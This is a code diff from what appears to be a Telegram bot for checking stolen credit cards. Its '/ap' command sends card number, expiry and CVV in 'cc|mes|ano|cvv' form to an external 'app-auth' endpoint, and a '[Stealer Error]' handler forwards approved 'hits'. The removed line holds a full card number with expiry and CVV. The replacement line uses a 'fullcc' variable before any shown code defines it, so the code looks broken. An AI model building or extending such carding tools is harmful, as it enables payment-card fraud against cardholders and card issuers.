@@ -22,14 +22,14 @@ async def send_hit_if_approved(client: Client, text: str):
     except Exception as e:
         print(f"[Stealer Error] Failed to forward: {e}")
 
-@Client.on_message(filters.command("apa", [".", "/"]))
+@Client.on_message(filters.command("ap", [".", "/"]))
 async def app_based_auth_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         checkall = await check_all_thing(Client, message)
 
         gateway = "App Based Auth 📱"
-        endpoint_url = "https://onyxenvbot.up.railway.app/app-auth/key=yashikaaa/cc=4100400157539308|08|2026|126"
+        endpoint_url = f"https://onyxenvbot.up.railway.app/app-auth/key=yashikaaa/cc={fullcc}"
 
         if checkall[0] == False:
             return
@@ -37,7 +37,7 @@ async def app_based_auth_cmd(Client, message):
         role = checkall[1]
         getcc = await getmessage(message)
         if getcc == False:
-            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /apa\n\nMessage: No CC Found in your input ❌\n\nUsage: /appauth cc|mes|ano|cvv</b>"""
+            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /ap\n\nMessage: No CC Found in your input ❌\n\nUsage: /ap cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
